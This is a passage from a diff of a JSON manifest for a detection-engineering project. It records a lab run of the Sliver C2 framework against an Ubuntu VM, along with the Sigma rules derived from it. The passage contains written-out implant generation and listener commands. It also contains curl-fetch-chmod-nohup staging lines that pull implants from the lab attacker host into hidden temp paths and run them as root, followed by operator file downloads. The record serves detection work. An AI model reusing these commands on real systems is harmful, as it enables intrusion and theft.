@@ -283,6 +283,26 @@
     {
       "path": "evidence/network-signals.json",
       "description": "Sanitized Zeek, Suricata, JA3/JA3S, JARM, TLS, DNS, alert, and aggregate timing evidence."
+    },
+    {
+      "path": "evidence/linux-endpoint-signals.json",
+      "description": "Sanitized Linux Sysmon/auditd fields, dimension status, attribution source, rule hits, counts, and hashes for all four Linux flows."
+    },
+    {
+      "path": "evidence/linux-network-signals.json",
+      "description": "Sanitized per-flow pcap hashes, Zeek/Suricata metadata, HTTP profile, JA3/JA3S/JARM, and measured cadence; no raw packets or logs."
+    },
+    {
+      "path": "evidence/safety/lab-scope.json",
+      "description": "PASS verdict from combined Zeek flow output and auditd-correlated process attribution."
+    },
+    {
+      "path": "evidence/safety/dns-generated-triage/poc-review.json",
+      "description": "Mechanical pre-execution triage report for the generated Linux DNS implant."
+    },
+    {
+      "path": "evidence/safety/dns-generated-triage/poc-review.md",
+      "description": "REMnux static/source review and conditional safe-to-run-in-lab verdict for the generated Linux DNS implant."
     }
   ],
   "sigma": [
@@ -345,18 +365,20 @@
       "tier": "network_tier_1",
       "logsource": "zeek/tls",
       "status": "experimental",
-      "fp_likelihood": "medium",
-      "recommended_role": "alert",
-      "level": "high",
+      "fp_likelihood": "high",
+      "recommended_role": "hunt",
+      "level": "medium",
+      "provenance": ["Sliver v1.7.3 release", "evidence/network-signals.json prior Windows mTLS run", "evidence/linux-network-signals.json Linux HTTPS and mTLS flows"],
+      "authorship_bar": "A dimension upstream does not cover: NSM JA3/JA3S",
       "precision_measurement": {
         "measured": false,
         "reason": "not-testable-on-evtx",
         "fp_count": null,
         "fp_share_of_category_percent": null,
         "category_denominator": null,
-        "detection_hit": null,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
+        "detection_hit": true,
+        "positive_evidence": "15 of 15 Linux HTTPS TLS events and the one Linux mTLS TLS event matched",
+        "corpus": "run-local Zeek TLS evidence; clean EVTX remains inapplicable"
       }
     },
     {
@@ -364,18 +386,20 @@
       "tier": "network_tier_1",
       "logsource": "suricata/tls",
       "status": "experimental",
-      "fp_likelihood": "medium",
-      "recommended_role": "alert",
-      "level": "high",
+      "fp_likelihood": "high",
+      "recommended_role": "hunt",
+      "level": "medium",
+      "provenance": ["Sliver v1.7.3 release", "evidence/network-signals.json prior Windows mTLS run", "evidence/linux-network-signals.json Linux HTTPS and mTLS flows"],
+      "authorship_bar": "A dimension upstream does not cover: NSM JA3/JA3S",
       "precision_measurement": {
         "measured": false,
         "reason": "not-testable-on-evtx",
         "fp_count": null,
         "fp_share_of_category_percent": null,
         "category_denominator": null,
-        "detection_hit": null,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
+        "detection_hit": true,
+        "positive_evidence": "15 of 15 Linux HTTPS EVE TLS events and the one Linux mTLS EVE TLS event matched",
+        "corpus": "run-local Suricata TLS evidence; clean EVTX remains inapplicable"
       }
     },
     {
@@ -386,24 +410,379 @@
       "fp_likelihood": "high",
       "recommended_role": "hunt",
       "level": "low",
+      "provenance": ["Sliver v1.7.3 release", "evidence/network-signals.json prior Windows mTLS run", "evidence/linux-network-signals.json Linux HTTPS and mTLS flows"],
+      "authorship_bar": "A dimension upstream does not cover: NSM TLS metadata",
       "precision_measurement": {
         "measured": false,
         "reason": "not-testable-on-evtx",
         "fp_count": null,
         "fp_share_of_category_percent": null,
         "category_denominator": null,
-        "detection_hit": null,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
+        "detection_hit": true,
+        "positive_evidence": "15 Linux HTTPS events and the one Linux mTLS event matched",
+        "corpus": "run-local Zeek TLS evidence; clean EVTX remains inapplicable"
+      }
+    },
+    {
+      "path": "sigma/file_event_lnx_curl_writes_hidden_transient_executable.yml",
+      "tier": "endpoint_tier_2_hunt",
+      "logsource": "linux/file_event",
+      "status": "experimental",
+      "fp_likelihood": "high",
+      "recommended_role": "hunt",
+      "level": "low",
+      "provenance": ["Sliver v1.7.3 release", "evidence/linux-endpoint-signals.json all four delivery flows", "SigmaHQ master wget file-event comparison at 8eaafff1f2845a696050e05e72ba1140ee190698"],
+      "authorship_bar": "A dimension upstream does not cover: curl file-event telemetry",
+      "precision_measurement": {
+        "measured": false,
+        "reason": "not-testable-on-evtx",
+        "fp_count": null,
+        "fp_share_of_category_percent": null,
+        "category_denominator": null,
+        "detection_hit": true,
+        "positive_evidence": "one auditd-correlated curl file event in each of four Linux flows",
+        "corpus": "run-local Linux evidence"
+      }
+    },
+    {
+      "path": "sigma/proc_creation_lnx_hidden_executable_var_tmp.yml",
+      "tier": "endpoint_tier_2_hunt",
+      "logsource": "linux/process_creation",
+      "status": "experimental",
+      "fp_likelihood": "high",
+      "recommended_role": "hunt",
+      "level": "low",
+      "provenance": ["Sliver v1.7.3 release", "evidence/linux-endpoint-signals.json HTTPS and DNS delivery flows", "SigmaHQ master tmp and dev-shm execution comparison at 8eaafff1f2845a696050e05e72ba1140ee190698"],
+      "authorship_bar": "Form coverage: hidden /var/tmp execution",
+      "precision_measurement": {
+        "measured": false,
+        "reason": "not-testable-on-evtx",
+        "fp_count": null,
+        "fp_share_of_category_percent": null,
+        "category_denominator": null,
+        "detection_hit": true,
+        "positive_evidence": "one Sysmon EID 1 plus auditd identity event in each of the HTTPS and DNS flows",
+        "corpus": "run-local Linux evidence"
+      }
+    },
+    {
+      "path": "sigma/network_zeek_sliver_http_request_profile.yml",
+      "tier": "network_tier_1",
+      "logsource": "zeek/http",
+      "status": "experimental",
+      "fp_likelihood": "medium",
+      "recommended_role": "alert",
+      "level": "medium",
+      "provenance": ["Sliver v1.7.3 release", "evidence/linux-network-signals.json clear HTTP flow"],
+      "authorship_bar": "A dimension upstream does not cover: NSM HTTP profile and cadence",
+      "precision_measurement": {
+        "measured": false,
+        "reason": "not-testable-on-evtx",
+        "fp_count": null,
+        "fp_share_of_category_percent": null,
+        "category_denominator": null,
+        "detection_hit": true,
+        "positive_evidence": "12 of 12 Sliver POST events matched; the curl staging request did not",
+        "corpus": "run-local Zeek HTTP evidence"
+      }
+    },
+    {
+      "path": "sigma/network_suricata_sliver_http_request_profile.yml",
+      "tier": "network_tier_1",
+      "logsource": "suricata/http",
+      "status": "experimental",
+      "fp_likelihood": "medium",
+      "recommended_role": "alert",
+      "level": "medium",
+      "provenance": ["Sliver v1.7.3 release", "evidence/linux-network-signals.json clear HTTP flow"],
+      "authorship_bar": "A dimension upstream does not cover: NSM HTTP profile and cadence",
+      "precision_measurement": {
+        "measured": false,
+        "reason": "not-testable-on-evtx",
+        "fp_count": null,
+        "fp_share_of_category_percent": null,
+        "category_denominator": null,
+        "detection_hit": true,
+        "positive_evidence": "12 of 12 Sliver POST events matched; the curl staging request did not",
+        "corpus": "run-local Suricata EVE HTTP evidence"
+      }
+    },
+    {
+      "path": "sigma/network_zeek_sliver_dns_encoded_query_profile.yml",
+      "tier": "network_tier_1",
+      "logsource": "zeek/dns",
+      "status": "experimental",
+      "fp_likelihood": "medium",
+      "recommended_role": "alert",
+      "level": "medium",
+      "provenance": ["Sliver v1.7.3 release", "evidence/linux-network-signals.json DNS flow"],
+      "authorship_bar": "A dimension upstream does not cover: NSM DNS query structure and cadence",
+      "precision_measurement": {
+        "measured": false,
+        "reason": "not-testable-on-evtx",
+        "fp_count": null,
+        "fp_share_of_category_percent": null,
+        "category_denominator": null,
+        "detection_hit": true,
+        "positive_evidence": "23 of 73 Sliver C2 queries matched; no Ubuntu NTP lookup or HTTP staging event matched",
+        "corpus": "run-local Zeek DNS evidence"
+      }
+    },
+    {
+      "path": "sigma/network_suricata_sliver_dns_encoded_query_profile.yml",
+      "tier": "network_tier_1",
+      "logsource": "suricata/dns",
+      "status": "experimental",
+      "fp_likelihood": "medium",
+      "recommended_role": "alert",
+      "level": "medium",
+      "provenance": ["Sliver v1.7.3 release", "evidence/linux-network-signals.json DNS flow"],
+      "authorship_bar": "A dimension upstream does not cover: NSM DNS query structure and cadence",
+      "precision_measurement": {
+        "measured": false,
+        "reason": "not-testable-on-evtx",
+        "fp_count": null,
+        "fp_share_of_category_percent": null,
+        "category_denominator": null,
+        "detection_hit": true,
+        "positive_evidence": "23 of 73 Sliver C2 query events matched; no Ubuntu NTP lookup or HTTP staging event matched",
+        "corpus": "run-local Suricata EVE DNS evidence"
       }
     }
   ],
+  "linux_extension": {
+    "verified_at": "2026-08-10T20:46:42Z",
+    "scenario_reference": "scenarios.md#verified-linux-scenarios",
+    "environment": {
+      "attacker": {"vmid": 100, "address": "192.168.1.50", "role": "isolated Sliver server, operator, staging, and C2"},
+      "target": {"vmid": 103, "address": "192.168.1.51", "os": "Ubuntu 24.04.4 LTS", "kernel": "6.8.0-137-generic", "execution_user": "root"},
+      "nsm": {"vmid": 106, "role": "offline pcap analysis and lab-scoped active JARM", "zeek": "8.2.1", "suricata": "7.0.10 RELEASE", "et_open_rules": 52234},
+      "sensors": ["Sysmon for Linux 1.5.2", "auditd 3.1.2", "tcpdump", "/opt/lab/collect-run.sh"],
+      "baseline_snapshot": "linux_verify_baseline"
+    },
+    "tool_provenance": {
+      "source_repository": "https://github.com/BishopFox/sliver",
+      "release_url": "https://github.com/BishopFox/sliver/releases/tag/v1.7.3",
+      "release_tag": "v1.7.3",
+      "annotated_tag_object": "62619754081c1d2a199ac7f935ef30f1d48fb742",
+      "commit": "3bbaf805104dcc4a75414ee0084e8de50702cad4",
+      "source_archive_sha256": "c1ea9f8b6327e2994d3cc77dc601aa0b6860c1ab492b8e024943efac594a784f",
+      "server_asset_sha256": "e3216ecd12f6e7e97cb4588bb6d85c70eca3bdfad8b0818ffd53ccb2e357ccc8",
+      "client_asset_sha256": "b0e328a131e4d679e9b268552db99ca2d46051b9205a67f9b7f7c1628983daae",
+      "compiled_at": "2026-02-24T04:49:28Z",
+      "triage": "safety/poc-triage.py returned NEEDS-HUMAN-REVIEW for both official assets and all generated implants; source and REMnux static review produced the conditional safe-to-run-in-lab verdicts in evidence/safety/poc-review.md and evidence/safety/dns-generated-triage/poc-review.md"
+    },
+    "runtime_controls": {
+      "update_check": "disabled with SLIVER_NO_UPDATE_CHECK=1",
+      "kali_egress": "temporary execution-window firewall allowed only loopback and 192.168.1.0/24",
+      "dns_target_egress": "temporary IPv4/IPv6 OUTPUT guards on VM 103 allowed only loopback and 192.168.1.0/24; completed-flow counters rejected four IPv4 and three IPv6 off-lab base-OS attempts",
+      "dns_resolver": "resolvectl status eth0 was verified to list only 192.168.1.50 and routing domain ~. before the successful DNS implant launch",
+      "server_state": "isolated from pre-existing Kali Sliver state and deleted after collection",
+      "excluded_vms": [102, 108],
+      "persistence": {"status": "deferred", "reason": "optional systemd user persistence added no necessary transport evidence and would broaden the bounded run"}
+    },
+    "flows": [
+      {
+        "id": "linux-http-beacon",
+        "mode": "beacon",
+        "priority": "primary",
+        "implant": {"bytes": 34033812, "sha256": "a90a57fffa75d6135cbb503e9dbedc1f906405df4b11d93b9b5e14bb5e1d7147", "interval_seconds": 10, "jitter_seconds": 3, "c2": "http://192.168.1.50:8080 with force-http and no-fallback"},
+        "generation_command": "generate beacon --http 'http://192.168.1.50:8080?force-http=true&no-fallback=true' --os linux --arch amd64 --format exe --name LNX-HTTP --seconds 10 --jitter 3 --save <isolated-state>/artifacts/http-beacon",
+        "listener_command": "http --lhost 192.168.1.50 --lport 8080 --long-poll-timeout 1s --long-poll-jitter 2s",
+        "operator_actions": [
+          {"action": "stage and execute", "target_command": "curl --noproxy '*' -fsS --connect-timeout 5 --max-time 120 http://192.168.1.50:18080/cdn-update -o /tmp/.cache-update-6f32; sha256sum; chmod 0700; nohup /tmp/.cache-update-6f32", "result": "target hash matched; root PID 1081"},
+          {"action": "select beacon", "command": "use fab2d044", "result": "lnx-http HTTP beacon selected"},
+          {"action": "identity and host survey", "command": "getuid; info", "result": "UID/GID 0; Ubuntu 24.04.4, kernel 6.8.0-137-generic, amd64, PID 1081, 10s/3s"},
+          {"action": "directory listing", "command": "ls /tmp", "result": "task 6e1a1888 completed"},
+          {"action": "small file download", "command": "download /tmp/sliver-lab-marker.txt /root/sliver-linux-verify/downloads/http-marker.txt", "result": "task a309bf95 completed; fixed 24-byte marker SHA-256 988b00de131ef40ad08dc58ddc6971e861fafb3a47e5bd23b46a45f6e05bf538"}
+        ],
+        "dimensions": {
+          "network_and_dns": {"status": "observed", "signal": "clear HTTP POST/GET profile, 10+0-3 second flow cadence, and auditd-correlated process ownership; no implant DNS"},
+          "files": {"status": "observed", "signal": "curl create, chmod, and fixed marker create"},
+          "registry": {"status": "not_applicable", "signal": "no Linux analogue"},
+          "process_identity_and_command": {"status": "observed", "signal": "curl/chmod/nohup and renamed ELF execution as root"},
+          "parent_child": {"status": "observed delivery ancestry; none observed from implant tasking", "signal": "shell-to-downloader/chmod/implant chain; selected Sliver tasks remained in-process"}
+        },
+        "network_observation": {"ja3": null, "ja3s": null, "jarm": "not_applicable", "periodicity_seconds": {"gaps": 8, "min": 10.060682, "max": 12.906521, "mean": 11.067974, "median": 10.939236, "population_stdev": 0.846348}, "http_profile_matches": {"zeek": 12, "suricata": 12}},
+        "rules_fired": ["file_event_lnx_curl_writes_hidden_transient_executable.yml", "network_zeek_sliver_http_request_profile.yml", "network_suricata_sliver_http_request_profile.yml", "upstream proc_creation_lnx_susp_execution_tmp_folder.yml", "upstream proc_creation_lnx_curl_usage.yml", "upstream proc_creation_lnx_nohup_susp_execution.yml"],
+        "pcap": {"bytes": 33793907, "sha256": "90f8338bba69e57311a82b774e4a9a655923f0b95ed6c37a646ab3429143c774", "raw_committed": false}
+      },
+      {
+        "id": "linux-https-beacon",
+        "mode": "beacon",
+        "implant": {"bytes": 34087060, "sha256": "ecc0d43260637bdd58fa03ee045b3c021a63f538962936d5adff533c105e6f06", "interval_seconds": 10, "jitter_seconds": 3, "c2": "https://192.168.1.50:8443 with no-fallback"},
+        "generation_command": "generate beacon --http 'https://192.168.1.50:8443?no-fallback=true' --os linux --arch amd64 --format exe --name LNX-WEBTLS --seconds 10 --jitter 3 --save <isolated-state>/artifacts/https-beacon",
+        "listener_command": "https --lhost 192.168.1.50 --lport 8443 --long-poll-timeout 1s --long-poll-jitter 2s",
+        "operator_actions": [
+          {"action": "stage and execute", "target_command": "curl --noproxy '*' -fsS --connect-timeout 5 --max-time 120 http://192.168.1.50:18080/asset-pack -o /var/tmp/.lib-cache-93a1; sha256sum; chmod 0700; nohup /var/tmp/.lib-cache-93a1", "result": "target hash matched; root PID 1233"},
+          {"action": "select beacon", "command": "use 3900bbe2", "result": "lnx-webtls HTTPS beacon selected"},
+          {"action": "identity and host survey", "command": "getuid; info", "result": "UID/GID 0; Ubuntu 24.04.4, kernel 6.8.0-137-generic, amd64, PID 1233, 10s/3s"},
+          {"action": "directory listing", "command": "ls /var/tmp", "result": "task 491f914e completed with a 742-byte response"}
+        ],
+        "dimensions": {
+          "network_and_dns": {"status": "observed", "signal": "TLS metadata, shared JA3/JA3S, no SNI/cert row, repeated flow cadence, and auditd-correlated ownership; no implant DNS"},
+          "files": {"status": "observed", "signal": "curl create and chmod"},
+          "registry": {"status": "not_applicable", "signal": "no Linux analogue"},
+          "process_identity_and_command": {"status": "observed", "signal": "curl/chmod/nohup and renamed ELF execution as root"},
+          "parent_child": {"status": "observed delivery ancestry; none observed from implant tasking", "signal": "shell-to-downloader/chmod/implant chain; selected Sliver tasks remained in-process"}
+        },
+        "network_observation": {"ja3": "2196848d251b217de8b2c037e356c11d", "ja3s": "f4febc55ea12b31ae17cfb7e614afda8", "jarm": "00000000000000000000000000000000000000000000000000000000000000", "periodicity_seconds": {"gaps": 11, "min": 10.517056, "max": 12.954395, "mean": 11.809799, "median": 11.750658, "population_stdev": 0.740845}, "http_request_profile": "not observed because encrypted"},
+        "rules_fired": ["file_event_lnx_curl_writes_hidden_transient_executable.yml", "proc_creation_lnx_hidden_executable_var_tmp.yml", "network_zeek_sliver_mtls_ja3_pair.yml", "network_suricata_sliver_mtls_ja3_pair.yml", "network_zeek_tls13_no_sni_no_visible_cert.yml", "upstream proc_creation_lnx_curl_usage.yml"],
+        "pcap": {"bytes": 34267699, "sha256": "27530bb69d4b01708994c3dfbcbcdbcc4934fcc065959f949af931cf206e64ac", "raw_committed": false}
+      },
+      {
+        "id": "linux-mtls-session",
+        "mode": "session",
+        "implant": {"bytes": 31617172, "sha256": "9486029ad1c276cbea9c827878c252c182b1a948c77b965b0e097900c70c6ade", "c2": "mtls://192.168.1.50:31337"},
+        "generation_command": "generate --mtls 192.168.1.50:31337 --os linux --arch amd64 --format exe --name LNX-RAW --save <isolated-state>/artifacts/mtls-session",
+        "listener_command": "mtls --lhost 192.168.1.50 --lport 31337",
+        "operator_actions": [
+          {"action": "stage and execute", "target_command": "curl --noproxy '*' -fsS --connect-timeout 5 --max-time 120 http://192.168.1.50:18080/runtime -o /dev/shm/.dbus-helper-417; sha256sum; chmod 0700; nohup /dev/shm/.dbus-helper-417", "result": "target hash matched; root PID 1388"},
+          {"action": "select session", "command": "use 739fe913", "result": "lnx-raw mTLS session selected"},
+          {"action": "identity and host survey", "command": "getuid; info", "result": "UID/GID 0; Ubuntu 24.04.4, kernel 6.8.0-137-generic, amd64, PID 1388"},
+          {"action": "directory listing", "command": "ls /opt/lab", "result": "completed synchronously"},
+          {"action": "small file download", "command": "download /tmp/sliver-lab-marker.txt /root/sliver-linux-verify/downloads/mtls-marker.txt", "result": "completed; fixed 24-byte marker SHA-256 988b00de131ef40ad08dc58ddc6971e861fafb3a47e5bd23b46a45f6e05bf538"}
+        ],
+        "dimensions": {
+          "network_and_dns": {"status": "observed", "signal": "one long-lived TLS flow, shared JA3/JA3S, no SNI/cert row, and auditd-correlated ownership; no implant DNS and no beacon periodicity"},
+          "files": {"status": "observed", "signal": "curl create and chmod; fixed marker read for download"},
+          "registry": {"status": "not_applicable", "signal": "no Linux analogue"},
+          "process_identity_and_command": {"status": "observed", "signal": "curl/chmod/nohup and renamed ELF execution as root"},
+          "parent_child": {"status": "observed delivery ancestry; none observed from implant tasking", "signal": "shell-to-downloader/chmod/implant chain; selected Sliver tasks remained in-process"}
+        },
+        "network_observation": {"ja3": "2196848d251b217de8b2c037e356c11d", "ja3s": "f4febc55ea12b31ae17cfb7e614afda8", "jarm": "00000000000000000000000000000000000000000000000000000000000000", "flow_duration_seconds": 60.057947, "periodicity": "none observed in session mode", "http_request_profile": "not_applicable"},
+        "rules_fired": ["file_event_lnx_curl_writes_hidden_transient_executable.yml", "network_zeek_sliver_mtls_ja3_pair.yml", "network_suricata_sliver_mtls_ja3_pair.yml", "network_zeek_tls13_no_sni_no_visible_cert.yml", "upstream proc_creation_lnx_susp_exec_from_dev_shm.yml", "upstream proc_creation_lnx_curl_usage.yml"],
+        "pcap": {"bytes": 31448106, "sha256": "fa57312b7de6f46f63703fbab5d36c762b0b5fe418ff1960825c4d98d9d05d72", "raw_committed": false}
+      },
+      {
+        "id": "linux-dns-beacon",
+        "mode": "beacon",
+        "implant": {"bytes": 32407700, "sha256": "2d8c61ff160c7f7e371c85a51958d5dc55ce5ee179df8d3588d64354df20a523", "interval_seconds": 10, "jitter_seconds": 3, "c2": "dns://c2.sliver.lab. through exclusive resolver 192.168.1.50:53"},
+        "generation_command": "generate beacon --dns c2.sliver.lab. --os linux --arch amd64 --format exe --name LNX-DNS --seconds 10 --jitter 3 --save <isolated-state>/generated/dns-beacon",
+        "listener_command": "dns --domains c2.sliver.lab. --lhost 192.168.1.50 --lport 53 --no-canaries",
+        "operator_actions": [
+          {"action": "verify resolver and egress controls", "target_command": "resolvectl dns eth0 192.168.1.50; resolvectl domain eth0 '~.'; verify resolvectl status eth0; install IPv4/IPv6 lab-only OUTPUT guards", "result": "eth0 listed only 192.168.1.50; target and Kali egress guards active"},
+          {"action": "stage and execute", "target_command": "curl --noproxy '*' -fsS --connect-timeout 5 --max-time 120 http://192.168.1.50:18080/dns-beacon -o /var/tmp/.net-cache-284e; sha256sum; chmod 0700; nohup /var/tmp/.net-cache-284e", "result": "target hash matched; root PID 1053"},
+          {"action": "select beacon", "command": "use d39f5aee", "result": "lnx-dns DNS beacon selected"},
+          {"action": "identity and host survey", "command": "getuid; info", "result": "UID/GID 0; Ubuntu 24.04.4, kernel 6.8.0-137-generic, amd64, PID 1053, 10s/3s"},
+          {"action": "directory listing", "command": "ls /opt/lab", "result": "task 524307af completed; 267-byte response"},
+          {"action": "small file download", "command": "download /etc/hostname /root/sliver-dns-verify/downloads/hostname-d39f5aee", "result": "task 061fa58d completed; 64-byte C2 response for the 7-byte file"}
+        ],
+        "dimensions": {
+          "network_and_dns": {"status": "observed", "signal": "73 encoded A/TXT C2 queries in 15 bursts; auditd attributed 72 implant connects to the local resolver stub and the pcap showed the resolver leg only to Kali"},
+          "files": {"status": "observed", "signal": "curl create and chmod; /etc/hostname was read for the completed download task without a target-side write"},
+          "registry": {"status": "not_applicable", "signal": "no Linux analogue"},
+          "process_identity_and_command": {"status": "observed", "signal": "curl/sha256sum/chmod/nohup and renamed ELF execution as root"},
+          "parent_child": {"status": "observed delivery ancestry; none observed from implant tasking", "signal": "shell-to-downloader/chmod/implant chain; selected Sliver tasks remained in-process"}
+        },
+        "network_observation": {
+          "ja3": null,
+          "ja3s": null,
+          "jarm": "not_applicable",
+          "http_request_profile": "not_applicable to DNS C2; HTTP was used only for staging",
+          "queries": 73,
+          "query_types": {"A": 39, "TXT": 34},
+          "encoded_profile_matches": {"zeek": 23, "suricata": 23},
+          "periodicity_seconds": {"bursts": 15, "gaps": 14, "min": 10.212432, "max": 13.520596, "mean": 11.435653, "median": 11.301192, "population_stdev": 0.881865}
+        },
+        "rules_fired": ["file_event_lnx_curl_writes_hidden_transient_executable.yml", "proc_creation_lnx_hidden_executable_var_tmp.yml", "network_zeek_sliver_dns_encoded_query_profile.yml", "network_suricata_sliver_dns_encoded_query_profile.yml", "upstream proc_creation_lnx_curl_usage.yml"],
+        "pcap": {"bytes": 27939667, "sha256": "f62779183c726ee9210f2a73917ad2f92760334d5f48b0b1f6a44a6d2bd171d1", "raw_committed": false}
+      }
+    ],
+    "transport_comparison": "The HTTPS beacon and raw mTLS session had identical JA3, JA3S, and all-zero JARM in this v1.7.3 run. HTTPS was distinguishable by repeated short connections at the configured cadence; mTLS session mode held one 60.057947-second flow. Clear HTTP exposed its request profile, DNS exposed encoded A/TXT query bursts, and neither had TLS fingerprints.",
+    "scope_check": {"verdict": "PASS", "evidence": "evidence/safety/lab-scope.json", "process_attribution": "collect-run auditd:lab_connect correlation was used for TCP and auditd SYSCALL/SOCKADDR pairs attributed DNS implant connects to 127.0.0.53; raw EID 3 Image was not used as sole ownership proof"},
+    "cleanup": {"kali": "listeners stopped, isolated state and generated implants deleted, temporary egress chain removed", "remnux": "temporary static-analysis artifacts deleted", "nsm": "temporary active-JARM script deleted", "target": "VM 103 rolled back to linux_verify_baseline after every execution; final Proxmox task exit status OK; Sysmon, auditd, and qemu-guest-agent active, four instrumentation hashes matched, and no run path or implant remained"}
+  },
+  "upstream": {
+    "baseline": "SigmaHQ master",
+    "commit": "8eaafff1f2845a696050e05e72ba1140ee190698",
+    "sliver_rule_count": 11,
+    "conclusion": "Nothing upstream characterises a Sliver Linux implant behaviourally. The upstream Sliver-labelled Linux rules identify operator binary names or selected callback ports, while the implant was renamed and used operator-selected ports. Windows rules cannot cover the Linux implant.",
+    "relevant_rules": [
+      {"path": "rules/linux/process_creation/proc_creation_lnx_susp_hktl_execution.yml", "modified": "2024-09-19", "coverage": "does not cover the Linux implant", "reason": "matches Image ending /sliver-client or /sliver-server, which are operator binaries; all generated implants were renamed"},
+      {"path": "rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml", "modified": null, "coverage": "does not cover any lab C2 flow", "reason": "the rule filters RFC1918 destinations, so it cannot match these HTTP, HTTPS, mTLS, or DNS flows; Sliver ports are customizable"},
+      {"path": "rules/windows/builtin/system/service_control_manager/win_system_service_install_sliver.yml", "modified": null, "coverage": "Windows only", "reason": "default Windows service installation has no bearing on these Linux flows"},
+      {"path": "rules/windows/process_creation/proc_creation_win_hktl_sliver_c2_execution_pattern.yml", "modified": "2023-03-05", "coverage": "Windows only", "reason": "Windows command-line pattern and Windows logsource cannot cover Linux"}
+    ],
+    "generic_linux_rules_adopted": [
+      {"path": "rules/linux/process_creation/proc_creation_lnx_susp_execution_tmp_folder.yml", "modified": "2025-08-05", "result": "covered the renamed HTTP implant executing from /tmp; no duplicate local rule authored"},
+      {"path": "rules/linux/process_creation/proc_creation_lnx_susp_exec_from_dev_shm.yml", "modified": null, "result": "covered the renamed mTLS implant executing from /dev/shm; no duplicate local rule authored"},
+      {"path": "rules/linux/file_event/file_event_lnx_wget_download_file_in_tmp_dir.yml", "modified": null, "result": "covers wget file writes but not the curl delivery observed in all four flows"}
+    ],
+    "authored_rule_bars": [
+      {"path": "sigma/file_event_lnx_curl_writes_hidden_transient_executable.yml", "bar": "A dimension upstream does not cover", "why": "adds Linux file-event coverage for curl staging; upstream has wget file-event and generic curl process rules but no equivalent curl file-event rule"},
+      {"path": "sigma/proc_creation_lnx_hidden_executable_var_tmp.yml", "bar": "Form coverage", "why": "the lab proved renamed hidden /var/tmp execution; upstream's /tmp and /dev/shm execution rules miss this path"},
+      {"path": "sigma/network_zeek_sliver_http_request_profile.yml", "bar": "A dimension upstream does not cover", "why": "adds NSM HTTP URI/User-Agent/profile evidence and measured aggregation guidance"},
+      {"path": "sigma/network_suricata_sliver_http_request_profile.yml", "bar": "A dimension upstream does not cover", "why": "adds the same proven HTTP profile for Suricata EVE"},
+      {"path": "sigma/network_zeek_sliver_mtls_ja3_pair.yml", "bar": "A dimension upstream does not cover", "why": "existing local NSM fingerprint rule is extended with Linux HTTPS/mTLS evidence and honest non-discrimination"},
+      {"path": "sigma/network_suricata_sliver_mtls_ja3_pair.yml", "bar": "A dimension upstream does not cover", "why": "existing local NSM fingerprint rule is extended with Linux HTTPS/mTLS evidence and honest non-discrimination"},
+      {"path": "sigma/network_zeek_sliver_dns_encoded_query_profile.yml", "bar": "A dimension upstream does not cover", "why": "adds address- and parent-domain-independent DNS query structure plus measured beacon-correlation guidance"},
+      {"path": "sigma/network_suricata_sliver_dns_encoded_query_profile.yml", "bar": "A dimension upstream does not cover", "why": "adds the same proven DNS query structure for Suricata EVE plus measured beacon-correlation guidance"}
+    ],
+    "reported_upstream": {"status": "not_reported", "reason": "local rules remain experimental and Linux endpoint precision was only judged qualitatively against run-local evidence"}
+  },
+  "audit_gate": {
+    "status": "PASS",
+    "measured_commit": "8a4cad0a352b46299fe809f654638a13fa79ffc1",
+    "iteration": 2,
+    "iteration_count": 2,
+    "exit_code": 0,
+    "output": "/opt/audit/results/gate-tools-sliver-20260810-2101/gate-result.md",
+    "report_hashes": {
+      "gate_result_json_sha256": "8c6c621665da7e50fba5b279cefab76a5860c5de25738582d5fdc275805b6e22",
+      "auditor_report_json_sha256": "1a26a8b41a111b6fa1f0e95f905ad9c2d58eabc6c45682d133480b8bd8c4ebc0"
+    },
+    "safety": "safe",
+    "blockers": 0,
+    "non_blocking_findings": 10,
+    "harness": {
+      "rule_count": 12,
+      "blocking": 0,
+      "pass": 3,
+      "not_testable_on_evtx": 9
+    },
+    "precision_source": {
+      "path": "/opt/audit/results/gate-tools-sliver-20260810-2101/precision/precision-input.json",
+      "repo_commit_measured": "8a4cad0",
+      "auditor_report_commit": "8a4cad0a352b46299fe809f654638a13fa79ffc1",
+      "reconciliation_rule": "fp_likelihood = max(measured floor, auditor judgement); high fp_likelihood forces recommended_role=hunt and recommended level<=low"
+    },
+    "precision": [
+      {"rule": "file_event_lnx_curl_writes_hidden_transient_executable.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": 542441, "detection_hit": null, "fp_likelihood": "high", "recommended_role": "hunt", "recommended_level": "low"},
+      {"rule": "file_event_script_host_writes_executable.yml", "harness_verdict": "pass", "fp_count": 64, "fp_share_of_category_percent": 0.011799, "category_denominator": 542441, "detection_hit": true, "fp_likelihood": "high", "recommended_role": "hunt", "recommended_level": "low"},
+      {"rule": "network_suricata_sliver_dns_encoded_query_profile.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "medium", "recommended_role": "alert", "recommended_level": "medium"},
+      {"rule": "network_suricata_sliver_http_request_profile.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "medium", "recommended_role": "alert", "recommended_level": "medium"},
+      {"rule": "network_suricata_sliver_mtls_ja3_pair.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "high", "recommended_role": "hunt", "repository_level_at_measured_commit": "medium", "recommended_level": "low"},
+      {"rule": "network_zeek_sliver_dns_encoded_query_profile.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "medium", "recommended_role": "alert", "recommended_level": "medium"},
+      {"rule": "network_zeek_sliver_http_request_profile.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "medium", "recommended_role": "alert", "recommended_level": "medium"},
+      {"rule": "network_zeek_sliver_mtls_ja3_pair.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "high", "recommended_role": "hunt", "repository_level_at_measured_commit": "medium", "recommended_level": "low"},
